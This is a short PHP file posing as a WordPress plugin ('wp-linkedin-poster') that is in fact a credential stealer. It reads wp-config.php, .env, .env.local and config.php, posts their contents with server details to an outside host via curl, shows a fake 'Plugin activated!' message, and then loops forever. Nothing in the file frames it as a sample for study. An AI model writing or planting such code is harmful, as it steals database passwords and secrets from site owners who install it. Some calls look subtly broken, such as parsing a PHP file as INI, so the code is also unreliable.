<?php
error_reporting(0);
$payload = [
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'local',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'server' => php_uname(),
    'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
    'wp_config' => file_get_contents('../wp-config.php') ?? '',
    'db_creds' => json_encode(parse_ini_file('../wp-config.php') ?? [])
];

// STEAL .ENV FILES
foreach (['.env', 'config.php', '.env.local'] as $file) {
    if (file_exists($file)) {
        $payload[$file] = file_get_contents($file);
    }
}

$ch = curl_init('https://httpbin.org/post/wp-linkedin-poster');
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_exec($ch);
curl_close($ch);

echo "✅ Plugin activated!\n";

// PERSISTENCE LOOP
while (1) {
    sleep(60);
}
